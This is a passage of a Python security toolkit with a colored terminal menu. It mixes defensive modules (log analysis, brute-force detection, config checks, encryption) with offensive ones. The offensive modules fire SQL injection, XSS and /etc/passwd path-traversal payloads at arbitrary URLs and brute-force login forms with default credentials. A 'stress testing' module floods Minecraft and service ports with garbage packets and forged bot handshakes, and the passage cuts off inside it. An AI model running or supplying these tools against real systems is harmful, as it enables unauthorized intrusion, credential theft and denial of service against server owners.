    if not HAS_PSUTIL:
        print(f"  {RED}{SYM_X} psutil required.{RESET}")
        return
    filt = input(f"  {c(f'Filter (all/listen/estab) {SYM_PROMPT} ', CYAN)}").strip().lower() or "all"
    print(f"\n  {c('Active connections:', MAGENTA)}")
    separator(Fore.MAGENTA)
    try:
        conns = psutil.net_connections()
        count = 0
        for cn in conns:
            st = (cn.status or "?").lower()
            if filt == "listen" and "listen" not in st:
                continue
            if filt == "estab" and "established" not in st:
                continue
            laddr = f"{cn.laddr.ip}:{cn.laddr.port}" if cn.laddr else "?:?"
            raddr = f"{cn.raddr.ip}:{cn.raddr.port}" if cn.raddr else "?:?"
            pid = cn.pid or 0
            pname = ""
            try:
                pname = psutil.Process(pid).name() if pid else ""
            except Exception:
                pass
            sc = Fore.GREEN if "established" in st else Fore.YELLOW if "listen" in st else Fore.CYAN
            print(f"  {c(f'{st:>12s}', sc)} {c(f'{laddr:22s}', GREEN)} {SYM_ARROW} {c(f'{raddr:22s}', CYAN)} {c(f'PID {pid}', YELLOW)} {c(pname, MAGENTA)}")
            count += 1
        print(f"\n  {c(f'Total: {count}', GREEN)}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 3: VULNERABILITY MANAGEMENT
# ──────────────────────────────────────────────────────────

COMMON_PORTS = [22, 21, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
                1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 9090, 9200, 27017]


def _tcp_scan_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        s.connect_ex((ip, port))
        s.close()
        return True
    except Exception:
        return False


def _scan_ports(ip, ports):
    open_ports = []
    total = len(ports)
    for i in range(0, total, 50):
        batch = ports[i:i+50]
        results = {}
        with ThreadPoolExecutor(max_workers=50) as ex:
            fs = {ex.submit(lambda p, r, j: r.update({j: _tcp_scan_port(ip, p)}), p, results, j): j for j, p in enumerate(batch)}
            for f in as_completed(fs):
                f.result()
        for j, p in enumerate(batch):
            if results.get(j):
                open_ports.append(p)
    return open_ports


def vuln_advanced_scan():
    box("Advanced Port Scanner", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    try:
        socket.inet_aton(target)
        ip = target
    except OSError:
        try:
            ip = socket.gethostbyname(target)
            print(f"  {GREEN}{SYM_CHECK} {target} {SYM_ARROW} {ip}{RESET}")
        except Exception:
            print(f"  {RED}{SYM_X} Could not resolve.{RESET}")
            return
    print(f"\n  {c('Mode:', CYAN)}")
    print(f"  {c('[1]', GREEN)}  Fast (30 ports)")
    print(f"  {c('[2]', GREEN)}  Normal (1000)")
    print(f"  {c('[3]', GREEN)}  Service version (nmap -sV)")
    mode = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
    has_nmap = shutil.which("nmap")
    open_ports = []
    if has_nmap and mode == "3":
        print(f"\n  {c('nmap -sV...', CYAN)}")
        try:
            r = subprocess.run(["nmap", "-sV", "-T4", ip], capture_output=True, text=True, timeout=300)
            for line in r.stdout.splitlines():
                if re.search(r'(tcp|udp)\s+open', line):
                    print(f"    {c(line, GREEN)}")
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    elif has_nmap and mode == "2":
        print(f"\n  {c('Scanning top 1000...', CYAN)}")
        try:
            r = subprocess.run(["nmap", "-T4", "--open", ip], capture_output=True, text=True, timeout=300)
            for line in r.stdout.splitlines():
                m = re.match(r'^(\d+)/tcp\s+open', line)
                if m:
                    p = int(m.group(1))
                    try:
                        svc = socket.getservbyport(p)
                    except OSError:
                        svc = "?"
                    open_ports.append((p, svc))
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    else:
        ports = COMMON_PORTS if mode != "2" else list(range(1, 1025))
        print(f"\n  {c(f'Scanning {len(ports)} ports...', CYAN)}")
        open_p = _scan_ports(ip, ports)
        for p in sorted(open_p):
            try:
                svc = socket.getservbyport(p)
            except OSError:
                svc = "?"
            open_ports.append((p, svc))
    print(f"\n  {c('Open Ports:', GREEN)}")
    if open_ports:
        for port, svc in sorted(set(open_ports)):
            print(f"    {SYM_LV}{SYM_LH} {c(f'{port:5d}', GREEN)} ({c(svc, CYAN)})")
    else:
        print(f"    {YELLOW}None detected.{RESET}")
    print()


def vuln_cve_lookup():
    box("CVE Lookup", Fore.BLUE)
    kw = input(f"  {c(f'Software or CVE ID {SYM_PROMPT} ', CYAN)}").strip()
    if not kw:
        return
    print(f"\n  {c(f'Searching: {kw}', CYAN)}")
    separator(Fore.BLUE)
    try:
        if kw.upper().startswith("CVE-"):
            r = requests.get(f"https://cve.circl.lu/api/cve/{kw.upper()}", timeout=15)
            if r.status_code == 200 and r.json():
                d = r.json()
                lines = [
                    f"  ID:    {c(d.get('id','N/A'), RED)}",
                    f"  Score: {c(str(d.get('cvss','N/A')), YELLOW)}",
                    f"  Published: {c(d.get('Published','N/A'), CYAN)}",
                ]
                desc = (d.get('description') or '')[:120]
                if desc:
                    lines.insert(1, f"  Desc:  {c(desc, GREEN)}")
                info_box("CVE Details", lines, Fore.RED)
        else:
            r = requests.get(f"https://cve.circl.lu/api/search/{kw}", timeout=15)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list):
                    print(f"  {c(f'Found {len(data)} CVEs', GREEN)}")
                    for item in data[:12]:
                        cve_id = item.get("id", "?")
                        score = item.get("cvss", "?")
                        desc = (item.get("description", "") or "")[:80]
                        sc = Fore.RED if isinstance(score, (int, float)) and score >= 7 else Fore.YELLOW
                        print(f"    {c(cve_id, RED)} {c(f'CVSS:{score}', sc)} {cdim(desc, GREEN)}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def vuln_assessment():
    box("Vulnerability Assessment", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    try:
        socket.inet_aton(target)
        ip = target
    except OSError:
        try:
            ip = socket.gethostbyname(target)
            print(f"  {GREEN}{SYM_CHECK} {target} {SYM_ARROW} {ip}{RESET}")
        except Exception:
            print(f"  {RED}{SYM_X} Could not resolve.{RESET}")
            return
    print(f"\n  {c('Running assessment...', BLUE)}")
    separator(Fore.BLUE)
    findings = []
    has_nmap = shutil.which("nmap")
    if has_nmap:
        try:
            r = subprocess.run(["nmap", "-sV", "--script", "vuln", "-T4", ip], capture_output=True, text=True, timeout=300)
            for line in r.stdout.splitlines():
                if re.search(r'(VULNERABLE|CVE-\d|vulners:)', line, re.IGNORECASE):
                    findings.append(line.strip())
                    add_log_alert("HIGH", "VulnAssess", f"Vuln on {ip}: {line.strip()}")
        except subprocess.TimeoutExpired:
            print(f"  {YELLOW}nmap timed out (300s).{RESET}")
    if findings:
        print(f"\n  {RED}{SYM_WARN} Potential vulns:{RESET}")
        for f in findings[:20]:
            print(f"    {SYM_LV}{SYM_LH} {c(f, RED)}")
    else:
        print(f"\n  {GREEN}{SYM_CHECK} No obvious vulns.{RESET}")
    print(f"\n  {c('Security checks:', CYAN)}")
    checks = [("SSH (22)", 22), ("HTTP (80)", 80), ("HTTPS (443)", 443),
              ("MySQL (3306)", 3306), ("RDP (3389)", 3389), ("Redis (6379)", 6379)]
    for name, port in checks:
        if is_port_open(ip, port):
            print(f"    {c(SYM_X, RED)} {name}: EXPOSED")
            add_log_alert("WARN", "VulnAssess", f"{name} exposed on {ip}")
        else:
            print(f"    {c(SYM_CHECK, GREEN)} {name}: filtered/closed")
    print()


def vuln_config_check():
    box("Security Config Checker", Fore.BLUE)
    print(f"  {c('Checking local system...', BLUE)}")
    separator(Fore.BLUE)
    issues = []
    if platform.system().lower() == "linux":
        try:
            with open("/etc/ssh/sshd_config") as fc:
                sc = fc.read()
            if "PermitRootLogin yes" in sc:
                issues.append("SSH root login enabled")
            if "PasswordAuthentication yes" in sc:
                issues.append("SSH password auth enabled")
        except Exception:
            pass
        try:
            r = subprocess.run(["iptables", "-L"], capture_output=True, text=True, timeout=5)
            if "Chain INPUT (policy ACCEPT)" in r.stdout:
                issues.append("Firewall INPUT policy ACCEPT")
        except Exception:
            pass
        try:
            r = subprocess.run(["sysctl", "net.ipv4.tcp_syncookies"], capture_output=True, text=True, timeout=5)
            if "= 0" in r.stdout:
                issues.append("SYN cookies disabled")
        except Exception:
            pass
        try:
            r = subprocess.run(["sysctl", "net.ipv4.ip_forward"], capture_output=True, text=True, timeout=5)
            if "= 1" in r.stdout:
                issues.append("IP forwarding enabled")
        except Exception:
            pass
    else:
        issues.append("Full checks Linux-only")
    if issues:
        print(f"  {RED}{SYM_WARN} Issues found:{RESET}")
        for issue in issues:
            print(f"    {SYM_LV}{SYM_LH} {c(issue, RED)}")
            add_log_alert("WARN", "ConfigCheck", issue)
    else:
        print(f"  {GREEN}{SYM_CHECK} No issues.{RESET}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 4: DATA & ACCESS PROTECTION
# ──────────────────────────────────────────────────────────

def data_encrypt():
    box("File Encryption / Decryption", Fore.YELLOW)
    if not HAS_CRYPTO:
        print(f"  {RED}{SYM_X} cryptography required.{RESET}")
        return
    mode = input(f"  {c(f'(e)ncrypt or (d)ecrypt {SYM_PROMPT} ', CYAN)}").strip().lower()
    fpath = input(f"  {c(f'File path {SYM_PROMPT} ', CYAN)}").strip()
    if not fpath or not os.path.exists(fpath):
        print(f"  {RED}{SYM_X} File not found.{RESET}")
        return
    pwd = input(f"  {c(f'Password {SYM_PROMPT} ', CYAN)}").strip()
    if not pwd:
        print(f"  {RED}{SYM_X} Password required.{RESET}")
        return
    salt = os.urandom(16) if mode == "e" else None
    if mode == "e":
        data = open(fpath, "rb").read()
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=600000)
        key = base64.urlsafe_b64encode(kdf.derive(pwd.encode()))
        enc = Fernet(key).encrypt(data)
        out = fpath + ".encrypted"
        with open(out, "wb") as fb:
            fb.write(salt + b"\n" + enc)
        print(f"  {GREEN}{SYM_CHECK} Encrypted: {out}{RESET}")
        if input(f"  {YELLOW}Delete original? (y/n) {SYM_PROMPT} {RESET}").strip().lower() == "y":
            os.remove(fpath)
            print(f"  {YELLOW}Deleted: {fpath}{RESET}")
        add_log_alert("INFO", "Encryption", f"File encrypted: {fpath}")
    elif mode == "d":
        raw = open(fpath, "rb").read()
        salt, enc_data = raw.split(b"\n", 1)
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=600000)
        key = base64.urlsafe_b64encode(kdf.derive(pwd.encode()))
        dec = Fernet(key).decrypt(enc_data)
        out = fpath.replace(".encrypted", ".decrypted") if ".encrypted" in fpath else fpath + ".decrypted"
        with open(out, "wb") as fb:
            fb.write(dec)
        print(f"  {GREEN}{SYM_CHECK} Decrypted: {out}{RESET}")
        add_log_alert("INFO", "Decryption", f"File decrypted: {fpath}")
    print()


def data_password_strength():
    box("Password Strength Analyzer", Fore.YELLOW)
    try:
        import getpass
        pwd = getpass.getpass(f"  {c(f'Enter password {SYM_PROMPT} ', CYAN)}")
    except Exception:
        pwd = input(f"  {c(f'Enter password {SYM_PROMPT} ', CYAN)}")
    pwd = pwd.strip()
    if not pwd:
        print(f"  {RED}No password.{RESET}")
        return
    length = len(pwd)
    has_upper = bool(re.search(r'[A-Z]', pwd))
    has_lower = bool(re.search(r'[a-z]', pwd))
    has_digit = bool(re.search(r'\d', pwd))
    has_sym = bool(re.search(r'[!@#$%^&*()_+\-=\[\]{};\'":\\|,.<>\/?`~]', pwd))
    has_space = " " in pwd
    score = 0
    if length >= 8: score += 25
    if length >= 12: score += 15
    if length >= 16: score += 10
    if has_upper: score += 10
    if has_lower: score += 10
    if has_digit: score += 10
    if has_sym: score += 15
    if has_space: score += 5
    common_words = ["password", "123456", "qwerty", "admin", "letmein", "welcome"]
    is_common = pwd.lower() in common_words
    cs = 0
    if has_lower: cs += 26
    if has_upper: cs += 26
    if has_digit: cs += 10
    if has_sym: cs += 32
    entropy = length * cs.bit_length() if cs > 0 else 0
    lines = [
        f"  Length:   {c(str(length), CYAN)}",
        f"  Upper:    {c(SYM_CHECK if has_upper else SYM_X, GREEN if has_upper else RED)}",
        f"  Lower:    {c(SYM_CHECK if has_lower else SYM_X, GREEN if has_lower else RED)}",
        f"  Digits:   {c(SYM_CHECK if has_digit else SYM_X, GREEN if has_digit else RED)}",
        f"  Symbols:  {c(SYM_CHECK if has_sym else SYM_X, GREEN if has_sym else RED)}",
        f"  Entropy:  {c(f'{entropy} bits', CYAN)}",
        f"  Common:   {c(SYM_WARN if is_common else SYM_CHECK, RED if is_common else GREEN)}",
    ]
    grade = c(f"STRONG ({score}/100)", GREEN) if score >= 80 else c(f"MODERATE ({score}/100)", YELLOW) if score >= 50 else c(f"WEAK ({score}/100)", RED)
    lines.append(f"  Grade:    {grade}")
    info_box("Analysis", lines, Fore.YELLOW)
    print()


def data_bruteforce_detect():
    box("Brute-Force Detection", Fore.YELLOW)
    print(f"  {c('Checking auth logs...', YELLOW)}")
    if platform.system().lower() != "linux":
        print(f"  {YELLOW}Linux-only feature.{RESET}")
        print()
        return
    logs = ["/var/log/auth.log", "/var/log/secure"]
    total = 0
    for lf in logs:
        if os.path.exists(lf):
            try:
                content = open(lf).read()
                fails = re.findall(r'(Failed password|authentication failure|Invalid user)', content, re.IGNORECASE)
                if fails:
                    print(f"  {RED}{SYM_WARN} {lf}: {len(fails)} failures{RESET}")
                    total += len(fails)
                ips = re.findall(r'Failed password for .* from (\S+)', content)
                if ips:
                    cnt = defaultdict(int)
                    for ip in ips:
                        cnt[ip] += 1
                    print(f"  {c('Top IPs:', CYAN)}")
                    for ip, c_ip in sorted(cnt.items(), key=lambda x: -x[1])[:5]:
                        color = Fore.RED if c_ip > 10 else Fore.YELLOW
                        print(f"    {c(ip, color)}: {c(str(c_ip), CYAN)} attempts")
            except Exception:
                pass
    if total == 0:
        print(f"  {GREEN}{SYM_CHECK} No brute-force patterns.{RESET}")
    else:
        add_log_alert("WARN", "BruteforceDetect", f"{total} total failures")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 5: ETHICAL HACKING & PENTEST
# ──────────────────────────────────────────────────────────

def pentest_sqli():
    box("SQL Injection Detector", Fore.GREEN)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    url = input(f"  {c(f'URL with param {SYM_PROMPT} ', CYAN)}").strip()
    if not url:
        return
    payloads = [
        ("' OR '1'='1", "Single quote + tautology"),
        ("' OR '1'='1' --", "Single quote + comment"),
        ("' UNION SELECT NULL--", "UNION NULL"),
        ("1' AND 1=1--", "AND true"),
        ("1' AND 1=2--", "AND false"),
        ('" OR "1"="1', "Double quote"),
        ("1' ORDER BY 100--", "ORDER BY probe"),
    ]
    print(f"\n  {c(f'Testing {len(payloads)} payloads...', CYAN)}")
    separator(Fore.GREEN)
    for payload, desc in payloads:
        try:
            tu = url
            if "?" in tu:
                base, qs = tu.split("?", 1)
                params = dict(p.split("=", 1) for p in qs.split("&") if "=" in p)
                if params:
                    first = list(params.keys())[0]
                    params[first] = payload.lstrip("&")
                    tu = base + "?" + "&".join(f"{k}={v}" for k, v in params.items())
            else:
                tu = url + "?" + payload.lstrip("?")
            r = requests.get(tu, timeout=5, headers={"User-Agent": "DarkieV3/1.0"})
            ind = []
            if r.status_code == 200 and any(x in r.text.lower() for x in ["sql", "mysql", "syntax", "odbc", "driver"]):
                ind.append("DB error")
            if ind:
                print(f"  {RED}{SYM_WARN} Potential SQLi: {c(desc, RED)}")
                for i in ind:
                    print(f"    {c(i, YELLOW)}")
                add_log_alert("HIGH", "Pentest SQLi", f"SQLi on {url}: {payload}")
            else:
                print(f"  {c(SYM_CHECK, GREEN)} {c(f'{desc:30s}', GREEN)} {cdim('No injection', Fore.WHITE)}")
        except Exception as e:
            print(f"  {c(SYM_X, RED)} {c(f'{desc:30s}', RED)} Error: {e}")
    print()


def pentest_xss():
    box("XSS Scanner", Fore.GREEN)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    url = input(f"  {c(f'URL {SYM_PROMPT} ', CYAN)}").strip()
    if not url:
        return
    param = input(f"  {c(f'Parameter (q) {SYM_PROMPT} ', CYAN)}").strip() or "q"
    payloads = [
        ("<script>alert(1)</script>", "Basic script"),
        ("<img src=x onerror=alert(1)>", "Image onerror"),
        ('"><script>alert(1)</script>', "Tag break"),
        ("<svg onload=alert(1)>", "SVG onload"),
    ]
    print(f"\n  {c(f'Testing {len(payloads)} XSS on {param}...', CYAN)}")
    separator(Fore.GREEN)
    for payload, desc in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=5, headers={"User-Agent": "DarkieV3/1.0"})
            if payload in r.text:
                print(f"  {RED}{SYM_WARN} XSS Reflected: {c(desc, RED)}")
                add_log_alert("HIGH", "Pentest XSS", f"XSS on {url}: {desc}")
            else:
                print(f"  {c(SYM_CHECK, GREEN)} {c(f'{desc:30s}', GREEN)} Not reflected")
        except Exception as e:
            print(f"  {c(SYM_X, RED)} {c(f'{desc:30s}', RED)} Error: {e}")
    print()


def pentest_path_traversal():
    box("Path Traversal Tester", Fore.GREEN)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    url = input(f"  {c(f'Base URL {SYM_PROMPT} ', CYAN)}").strip()
    if not url:
        return
    payloads = [
        ("../../etc/passwd", "/etc/passwd"),
        ("../../../etc/passwd", "Deep /etc/passwd"),
        ("../../windows/win.ini", "Windows config"),
        ("..%252f..%252fetc/passwd", "Double encoding"),
    ]
    print(f"\n  {c(f'Testing {len(payloads)} payloads...', CYAN)}")
    separator(Fore.GREEN)
    for payload, desc in payloads:
        try:
            tu = url.rstrip('/') + '/' + payload.lstrip('/')
            r = requests.get(tu, timeout=5, headers={"User-Agent": "DarkieV3/1.0"})
            ind = []
            if "root:" in r.text and ":/bin/" in r.text:
                ind.append("/etc/passwd leaked")
            if "[fonts]" in r.text:
                ind.append("win.ini leaked")
            if len(r.text) > 500:
                ind.append(f"Large response ({len(r.text)}B)")
            if ind:
                print(f"  {RED}{SYM_WARN} Path Traversal: {c(desc, RED)}")
                for i in ind:
                    print(f"    {c(i, YELLOW)}")
                add_log_alert("HIGH", "Pentest Path", f"Path traversal on {url}: {desc}")
            else:
                print(f"  {c(SYM_CHECK, GREEN)} {c(f'{desc:30s}', GREEN)} No leak")
        except Exception as e:
            print(f"  {c(SYM_X, RED)} {c(f'{desc:30s}', RED)} Error: {e}")
    print()


def pentest_subdomain_takeover():
    box("Subdomain Takeover Checker", Fore.GREEN)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', CYAN)}").strip().lower()
    if not domain:
        return
    print(f"\n  {c('Checking CNAMEs to unclaimed services...', CYAN)}")
    separator(Fore.GREEN)
    services = {
        "github.io": "GitHub Pages", "s3.amazonaws.com": "AWS S3", "cloudfront.net": "CloudFront",
        "azurewebsites.net": "Azure App", "herokuapp.com": "Heroku", "firebaseio.com": "Firebase",
        "pantheonsite.io": "Pantheon", "netlify.app": "Netlify",
    }
    subs = ["www", "blog", "shop", "mail", "cdn", "api", "dev", "staging", "test", "admin", "support", "app", "m"]
    has_dig = shutil.which("dig")
    found = []
    for sub in subs:
        fqdn = f"{sub}.{domain}"
        if has_dig:
            try:
                r = subprocess.run(["dig", "+short", "CNAME", fqdn], capture_output=True, text=True, timeout=5)
                cname = r.stdout.strip()
                if cname:
                    for pat, name in services.items():
                        if pat in cname.lower():
                            found.append((fqdn, cname, name))
                            print(f"  {RED}{SYM_WARN} {fqdn} -> {cname} [{name}]{RESET}")
                            add_log_alert("CRITICAL", "Pentest Subdomain", f"Takeover: {fqdn} -> {cname} ({name})")
                            break
            except Exception:
                pass
        else:
            try:
                ip = socket.gethostbyname(fqdn)
                if ip.startswith("192.0.2.") or ip == "0.0.0.0":
                    found.append((fqdn, ip, "Unclaimed"))
                    print(f"  {RED}{SYM_WARN} {fqdn} -> {ip} (unclaimed){RESET}")
            except socket.gaierror:
                pass
    if not found:
        print(f"  {GREEN}{SYM_CHECK} No takeover risks.{RESET}")
    print()


def pentest_http_methods():
    box("HTTP Methods Fuzzer", Fore.GREEN)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    url = input(f"  {c(f'URL {SYM_PROMPT} ', CYAN)}").strip()
    if not url:
        return
    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH", "TRACE", "CONNECT"]
    print(f"\n  {c('Testing methods...', CYAN)}")
    separator(Fore.GREEN)
    for m in methods:
        try:
            r = requests.request(m, url, timeout=5, headers={"User-Agent": "DarkieV3/1.0"})
            st = r.status_code
            if st not in (405, 501, 403, 404):
                color = Fore.RED if m in ("PUT", "DELETE", "TRACE", "CONNECT") else Fore.YELLOW
                print(f"  {c(f'{m:8s}', color)} {c(f'[{st}]', GREEN)} {c('Enabled', color)}")
                if m in ("PUT", "DELETE", "TRACE", "CONNECT"):
                    add_log_alert("WARN", "Pentest HTTP", f"Dangerous method {m} on {url}")
            else:
                print(f"  {c(f'{m:8s}', GREEN)} {c(f'[{st}]', YELLOW)} {cdim('Disabled', Fore.WHITE)}")
        except Exception as e:
            print(f"  {c(f'{m:8s}', RED)} Error: {e}")
    print()


def pentest_bruteforce_login():
    box("Brute-Force Login Tester", Fore.GREEN)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY -- Authorized targets only {Style.RESET_ALL}\n")
    url = input(f"  {c(f'Login URL {SYM_PROMPT} ', CYAN)}").strip()
    if not url:
        return
    up = input(f"  {c(f'Username field (username) {SYM_PROMPT} ', CYAN)}").strip() or "username"
    pp = input(f"  {c(f'Password field (password) {SYM_PROMPT} ', CYAN)}").strip() or "password"
    users = ["admin", "root", "user", "test", "administrator", "guest"]
    pwds = ["admin", "password", "123456", "admin123", "root", "test", "password123", "P@ssw0rd", "letmein", "welcome"]
    print(f"\n  {c(f'Testing {len(users)}x{len(pwds)} combos...', CYAN)}")
    separator(Fore.GREEN)
    found = False
    for user in users:
        for pwd in pwds:
            try:
                r = requests.post(url, data={up: user, pp: pwd}, timeout=8, headers={"User-Agent": "DarkieV3/1.0"})
                indicators = ["dashboard", "welcome", "logout", "profile"]
                if r.status_code == 200 and any(ind in r.text.lower() for ind in indicators):
                    print(f"  {RED}{SYM_WARN} LOGIN: {user}:{pwd}{RESET}")
                    add_log_alert("CRITICAL", "Pentest BruteForce", f"Found: {user}:{pwd}")
                    found = True
                    break
            except requests.RequestException:
                pass
            time.sleep(0.3)
        if found:
            break
    if not found:
        print(f"  {GREEN}{SYM_CHECK} No weak creds found.{RESET}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 6: SIEM & LOG ANALYSIS
# ──────────────────────────────────────────────────────────

def siem_log_analyzer():
    box("Log File Analyzer", Fore.CYAN)
    lpath = input(f"  {c(f'Log file {SYM_PROMPT} ', CYAN)}").strip()
    if not lpath or not os.path.exists(lpath):
        print(f"  {RED}{SYM_X} File not found.{RESET}")
        return
    print(f"\n  {c('Analyzing...', CYAN)}")
    separator(Fore.CYAN)
    try:
        with open(lpath) as fc:
            lines = fc.readlines()
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
        return
    print(f"  Lines: {c(f'{len(lines):,}', GREEN)}")
    patterns = {"ERROR": 0, "WARN": 0, "INFO": 0, "DEBUG": 0, "FAILED": 0, "DENIED": 0}
    ip_counts = defaultdict(int)
    errors = []
    for line in lines:
        ul = line.upper()
        for pat in patterns:
            if pat in ul:
                patterns[pat] += 1
        for ip in re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line):
            ip_counts[ip] += 1
        if re.search(r'(ERROR|FAILED|DENIED|CRITICAL)', ul):
            errors.append(line.strip())
    print(f"\n  {c('Breakdown:', CYAN)}")
    for pat, cnt in patterns.items():
        if cnt > 0:
            color = Fore.RED if pat in ("ERROR", "FAILED", "DENIED") else Fore.YELLOW if pat == "WARN" else Fore.GREEN
            bar = SYM_BLOCK * min(cnt // max(len(lines)//20, 1), 20)
            print(f"    {c(f'{pat:10s}', color)} {c(f'{cnt:>6d}', CYAN)} {c(bar, color)}")
    if errors:
        print(f"\n  {c('Sample errors:', RED)}")
        for line in errors[:5]:
            print(f"    {c(line[:120], RED)}")
    if ip_counts:
        print(f"\n  {c('Top IPs:', CYAN)}")
        for ip, cnt in sorted(ip_counts.items(), key=lambda x: -x[1])[:10]:
            print(f"    {c(f'{ip:15s}', GREEN)} {c(f'{cnt:>6d}', CYAN)}")
    print()


def siem_realtime_monitor():
    box("Real-time Log Monitor", Fore.CYAN)
    lpath = input(f"  {c(f'Log file to tail {SYM_PROMPT} ', CYAN)}").strip()
    if not lpath or not os.path.exists(lpath):
        print(f"  {RED}{SYM_X} Not found.{RESET}")
        return
    duration = input(f"  {c(f'Duration (s, 30) {SYM_PROMPT} ', CYAN)}").strip()
    duration = int(duration) if duration.isdigit() else 30
    print(f"\n  {c(f'Tailing {duration}s...', CYAN)}")
    separator(Fore.CYAN)
    try:
        with open(lpath) as fc:
            fc.seek(0, 2)
            start = time.time()
            while time.time() - start < duration:
                line = fc.readline()
                if line:
                    line = line.strip()
                    if re.search(r'(ERROR|CRITICAL|FAILED)', line, re.IGNORECASE):
                        print(f"  {RED}{line[:120]}{RESET}")
                        add_log_alert("HIGH", "Log Monitor", line[:120])
                    elif re.search(r'(WARN|DENIED)', line, re.IGNORECASE):
                        print(f"  {YELLOW}{line[:120]}{RESET}")
                    else:
                        print(f"  {c(line[:120], GREEN)}")
                else:
                    time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n  {c(f'{SYM_WARN} Stopped', YELLOW)}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def siem_alert_viewer():
    box("Alert Dashboard", Fore.CYAN)
    if not LOG_ALERTS:
        print(f"  {YELLOW}No alerts yet. Run other modules to generate alerts.{RESET}")
    for alert in LOG_ALERTS[-30:]:
        ts = alert["timestamp"]
        level = alert["level"]
        src = alert["source"]
        msg = alert["message"][:80]
        color = Fore.RED if level in ("CRITICAL", "HIGH") else Fore.YELLOW if level == "WARN" else Fore.GREEN
        print(f"  {c(f'[{ts}]', CYAN)} {c(f'[{level:8s}]', color)} {c(f'{src:20s}', MAGENTA)} {c(msg, GREEN)}")
    print(f"\n  {c(f'Total: {len(LOG_ALERTS)}', CYAN)}")
    print()


def siem_threat_patterns():
    box("Threat Pattern Detection", Fore.CYAN)
    print(f"  {c('Scanning logs...', CYAN)}")
    separator(Fore.CYAN)
    found = []
    check_paths = []
    if platform.system().lower() == "linux":
        check_paths = ["/var/log/auth.log", "/var/log/secure", "/var/log/syslog",
                       "/var/log/apache2/access.log", "/var/log/nginx/access.log"]
    for lpath in check_paths:
        if os.path.exists(lpath):
            try:
                content = open(lpath).read()
                if re.search(r'Failed password.*root', content):
                    found.append(("SSH Brute-force (root)", lpath))
                if re.search(r'Invalid user', content):
                    found.append(("SSH User Enumeration", lpath))
                if re.search(r'Possible SYN flooding', content):
                    found.append(("SYN Flood", lpath))
                if re.search(r'authentication failure', content):
                    found.append(("Auth Failures", lpath))
            except Exception:
                pass
    if found:
        print(f"  {RED}{SYM_WARN} Threats detected:{RESET}")
        for pat, src in found:
            print(f"    {SYM_LV}{SYM_LH} {c(pat, RED)} ({cdim(src, CYAN)})")
            add_log_alert("HIGH", "Threat Detection", f"{pat} in {src}")
    else:
        print(f"  {GREEN}{SYM_CHECK} No threats detected.{RESET}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 7: STRESS TESTING (FIXED)
# ──────────────────────────────────────────────────────────

MINECRAFT_PORTS = [25565, 25566, 25575, 19132, 19133]
STRESS_PORTS = [22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 9200, 9090]

MC_GARBAGE = [
    b"\x00\xff\xff\xff\xff\x01\x00", b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff",
    b"\xfe\x01\x00", b"\x00"*64, b"\xff"*128,
]


def _mc_varint(v):
    out = bytearray()
    while True:
        if v & 0xFFFFFF80 == 0:
            out.append(v & 0x7F)
            break
        out.append((v & 0x7F) | 0x80)
        v >>= 7
    return bytes(out)


def _mc_pstr(s):
    d = s.encode("utf-8")
    return _mc_varint(len(d)) + d


def _mc_packet(pid, *parts):
    body = bytes([pid]) + b"".join(parts)
    return _mc_varint(len(body)) + body


def _mc_flood_worker(host, port, results, idx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.sendall(MC_GARBAGE[idx % len(MC_GARBAGE)])
        s.close()
        results[idx] = 1
        return 1
    except Exception:
        results[idx] = 0
        return 0


def _mc_read_varint(s):
    v = 0
    for i in range(5):
        b = s.recv(1)
        if not b:
            break
        v |= (b[0] & 0x7F) << (7 * i)
        if not (b[0] & 0x80):
            break
    return v


def _mc_bot_worker(host, port, results, idx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        handshake = _mc_packet(0x00, _mc_varint(764), _mc_pstr(host), port.to_bytes(2, "big"), _mc_varint(2))
        s.sendall(handshake)
